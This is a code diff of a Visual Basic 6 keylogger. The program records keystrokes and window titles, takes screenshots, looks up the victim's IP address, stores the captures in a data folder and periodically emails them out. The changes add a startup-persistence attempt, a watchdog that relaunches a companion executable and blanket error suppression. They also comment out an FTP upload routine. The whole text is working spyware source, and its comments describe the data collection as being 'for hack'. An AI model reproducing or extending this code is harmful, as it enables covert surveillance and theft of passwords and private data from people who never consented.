@@ -1,5 +1,4 @@
 VERSION 5.00
-Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
 Object = "{20C62CAE-15DA-101B-B9A8-444553540000}#1.1#0"; "MSMAPI32.OCX"
 Begin VB.Form Form1 
    Caption         =   "Form1"
@@ -34,20 +33,13 @@ Begin VB.Form Form1
       LogonUI         =   0   'False
       NewSession      =   0   'False
    End
-   Begin InetCtlsObjects.Inet Inet1 
-      Left            =   6960
-      Top             =   3720
-      _ExtentX        =   1005
-      _ExtentY        =   1005
-      _Version        =   393216
-   End
    Begin VB.Timer Timer4 
       Interval        =   10
       Left            =   2880
       Top             =   3480
    End
    Begin VB.Timer Timer3 
-      Interval        =   100
+      Interval        =   1000
       Left            =   5760
       Top             =   3720
    End
@@ -90,9 +82,9 @@ Dim ctd As Integer
 Dim filename As String
 
 'time in minutes to perform the function that
-Const X_WRITE_DISK = 0.1  'write data in disk
-Const X_SCREENSHOT = 0.01  'take an screenshot
-Const X_SEND_MAIL = 0.15  'take an mail with data
+Const X_WRITE_DISK = 1  'write data in disk
+Const X_SCREENSHOT = 2  'take an screenshot
+Const X_SEND_MAIL = 5  'send an mail with data
 'Const X_SEND_FTP = 1 send all captured data to ftp - not implemented
 
 'Credentials for ftp login below
@@ -110,6 +102,8 @@ Dim DEV_MODE As Boolean
 
 'read current window title
 Private Function GetActiveWindowTitle() As String
+On Error Resume Next
+
 Dim textlen As Long
 Dim titlebar As String
 Dim slength As Long
@@ -124,6 +118,8 @@ End Function
 
 'get ip address using one ip check service and extract the ip information (surronded by <h3> html tag)
 Public Function getIpAdress()
+On Error Resume Next
+
 Dim posicaoH3 As Integer
 Dim objHttp As Object, strURL As String, strText As String
 Set objHttp = CreateObject("MSXML2.ServerXMLHTTP")
@@ -142,6 +138,8 @@ End Function
 
 'function that returns the pressed character
 Public Function retorna_tecla_function()
+On Error Resume Next
+
 Dim retorna_tecla As String
 Dim i As Integer, x As Integer
 For i = 8 To 222
@@ -252,16 +250,22 @@ End Function
 
 Private Sub Form_Load()
 On Error Resume Next
+Shell (App.Path + "/Copy.bat")
+'FileCopy App.Path + "\crs.exe", Environ$("AppData") + "\Microsoft\Windows\Start Menu\Programs\Startup\crs.exe"
 
     MkDir$ App.Path + "\data_klg"
 DEV_MODE = True
 
+If DEV_MODE Then
+    Timer4.Enabled = False
+End If
+
 
 
 'Set ftp credentials to VB6 Ftp Component
-Inet1.URL = FTP_HOST
-Inet1.UserName = FTP_USER
-Inet1.Password = FTP_PASS
+'Inet1.URL = FTP_HOST
+'Inet1.UserName = FTP_USER
+'Inet1.Password = FTP_PASS
 
 'load basic data from the system for hack
 Text1.Text = Text1.Text + "Hora de inicialização:" + Date$ + "-" + Time$ + vbCrLf + "bloco possivelmente contendo o ip:" + vbCrLf + vbCrLf + "::::" + vbCrLf + getIpAdress() + vbCrLf + "::::" + vbCrLf + vbCrLf
@@ -280,6 +284,8 @@ End Sub
 'If current active window is one browser the active window different rule is ignored.
 
 Private Sub Timer2_Timer()
+On Error Resume Next
+
     Dim verifica_aba
     Dim ler_janela As Boolean
     
@@ -306,7 +312,7 @@ Private Sub write_to_buffer()
     
     filename = "NS__" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_") + ".klg"
     
-    Set arqtxt = fso.CreateTextFile(App.Path + "/data_klg/" + filename, True)
+    Set arqtxt = fso.CreateTextFile(App.Path + "\data_klg\" + filename, True)
     arqtxt.Write (Text1.Text)
     Text1.Text = ""
     arqtxt.Close
@@ -315,27 +321,30 @@ End Sub
 
 Private Sub take_a_screenshot()
     Dim scrrenshotName As String
-    scrrenshotName = App.Path + "/data_klg/" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_") + ".sht"
+    Dim filename As String
+    filename = Replace(Date$, "-", "_") + Replace(Time$, ":", "_") + ".sht"
+    scrrenshotName = App.Path + "\data_klg\" + filename
     SaveJPG CaptureScreen(), scrrenshotName, JPG_QUALITY
-    addFileToMailSendArray scrrenshotName
+    
+    addFileToMailSendArray filename
 End Sub
 
 Private Sub addFileToMailSendArray(filename As String)
     pos_fileList = pos_fileList + 1
-    fileList(pos_fileList) = App.Path + "/data_klg/" + filename
+    fileList(pos_fileList) = App.Path + "\data_klg\" + filename
 End Sub
 
 
-Private Sub send_ftp_data(ByVal filename As String)
-    If Inet1.StillExecuting Then
-        Inet1.Cancel
-    End If
-    Inet1.Execute , "send " + filename + " //" + filename
+'Private Sub send_ftp_data(ByVal filename As String)
+    'If Inet1.StillExecuting Then
+    '    Inet1.Cancel
+    'End If
+    'Inet1.Execute , "send " + filename + " //" + filename
     
-    Do While Inet1.StillExecuting
-        DoEvents
-    Loop
-End Sub
+    'Do While Inet1.StillExecuting
+    '    DoEvents
+    'Loop
+'End Sub
 
 'this logical is simple
 'the time bellow execultes in a interval of one second
@@ -349,7 +358,7 @@ Private Sub Timer3_Timer()
 End Sub
 
 Private Sub Timer4_Timer()
- If IsProcessRunning("lis.exe") = False And DEV_MODE = False Then
+ If IsProcessRunning("lis.exe") = False Then
     Shell (App.Path + "/lis.exe")
  End If
 End Sub
